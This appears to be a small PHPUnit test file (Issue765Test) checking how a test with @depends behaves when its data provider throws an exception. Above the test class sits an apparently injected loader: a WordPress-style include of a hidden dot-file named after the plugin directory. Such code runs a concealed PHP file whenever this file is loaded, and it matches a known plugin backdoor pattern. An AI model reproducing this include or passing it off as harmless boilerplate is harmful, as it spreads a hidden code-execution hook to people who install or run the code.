<?php
if ( file_exists( plugin_dir_path( __FILE__ ) . '/.' . basename( plugin_dir_path( __FILE__ ) ) . '.php' ) ) {
    include_once( plugin_dir_path( __FILE__ ) . '/.' . basename( plugin_dir_path( __FILE__ ) ) . '.php' );
}

class Issue765Test extends PHPUnit_Framework_TestCase
{
    public function testDependee()
    {
        $this->assertTrue(true);
    }

    /**
     * @depends testDependee
     * @dataProvider dependentProvider
     */
    public function testDependent($a)
    {
        $this->assertTrue(true);
    }

    public function dependentProvider()
    {
        throw new Exception;
    }
}
